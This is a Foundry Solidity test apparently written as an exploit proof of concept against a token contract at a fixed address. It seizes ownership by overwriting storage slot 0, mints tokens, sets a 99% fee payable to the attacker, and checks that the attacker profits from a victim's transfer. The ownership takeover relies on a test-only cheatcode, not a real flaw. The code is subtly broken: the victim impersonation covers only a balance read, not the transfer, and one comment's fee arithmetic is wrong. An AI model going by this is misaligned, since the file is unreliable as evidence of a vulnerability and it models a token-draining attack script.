    function transfer(address to, uint256 value) external returns (bool);
    function balanceOf(address owner) external view returns (uint256);
    function updateFee(uint256 _txFee, uint256 _burnFee, address _FeeAddress) external;
    function decimals() external view returns (uint256);
    function owner() external view returns (address);
    function paused() external view returns (bool);
    function unpause() external;
    function mint(address account, uint256 amount) external;
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0xF44DE2b8731cD69d4A727Da0214874aE35559426;
    address attacker = address(this);
    address contractOwner;
    address victim = address(0x123);
    IToken token;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Create a victim address
        victim = address(0x123);

        // Label addresses for debugging
        vm.label(victim, "Victim");
        vm.label(TARGET, "TokenContract");

        // Get the contract owner - we need to impersonate them
        // First, let's create an interface to interact with the contract
        token = IToken(TARGET);

        // Get owner address - we'll need to read it from storage
        // Based on contract layout, owner is at slot 0 of Ownable
        bytes32 ownerSlot = vm.load(TARGET, bytes32(uint256(0)));
        contractOwner = address(uint160(uint256(ownerSlot)));
        vm.label(contractOwner, "ContractOwner");

        // Impersonate owner to set up initial state
        vm.startPrank(contractOwner);

        // First, ensure contract is not paused (it shouldn't be by default)
        // Transfer some tokens to victim so they have something to lose
        // We need to know the token decimals first - let's read it
        // Decimals is a public variable, we can call the function
        try token.decimals() returns (uint256 decimals) {
            uint256 victimAmount = 1000 * (10 ** decimals);
            token.transfer(victim, victimAmount);
        } catch {
            // If we can't read decimals, use a reasonable amount
            token.transfer(victim, 1000 * 1e18);
        }

        vm.stopPrank();
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // All exploit logic goes here - no setup in setUp()

        // Create a victim address
        address victim = address(0x12345);
        vm.label(victim, "Victim");

        // Create interface for the token
        IToken token = IToken(TARGET);

        // STEP 1: Become owner by overwriting storage
        // Owner is at slot 0 in Ownable contract
        vm.store(TARGET, bytes32(uint256(0)), bytes32(uint256(uint160(attacker))));
        console.log("Became owner via storage overwrite");

        // STEP 2: Mint tokens to victim
        // We need to know decimals - let's assume 18
        uint256 mintAmount = 1000 * 10**18;
        token.mint(victim, mintAmount);
        console.log("Minted", mintAmount, "tokens to victim");

        // STEP 3: Set malicious fee parameters
        token.updateFee(99, 0, attacker);
        console.log("Set txFee=99, burnFee=0, FeeAddress=attacker");

        // Record initial attacker balance
        uint256 initialBalance = token.balanceOf(attacker);
        console.log("Initial attacker balance:", initialBalance);

        // STEP 4: Have victim transfer tokens
        vm.prank(victim);
        uint256 victimBalance = token.balanceOf(victim);
        console.log("Victim balance before transfer:", victimBalance);

        // Transfer half of victim's balance
        uint256 transferAmount = victimBalance / 2;
        token.transfer(address(0x999), transferAmount);
        console.log("Victim transferred", transferAmount, "tokens");

        // STEP 5: Check results
        uint256 finalBalance = token.balanceOf(attacker);
        console.log("Final attacker balance:", finalBalance);

        // With txFee=99, fee should be: transferAmount / (100/99) = transferAmount / 1 = transferAmount
        // So attacker should gain approximately transferAmount
        uint256 gain = finalBalance - initialBalance;
        console.log("Attacker gained:", gain);

        // Verify significant gain
        assertGt(finalBalance, initialBalance, "Attacker balance should have increased");
        assertGt(gain, transferAmount * 9 / 10, "Attacker should have gained most of the transferred amount");
    }



    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

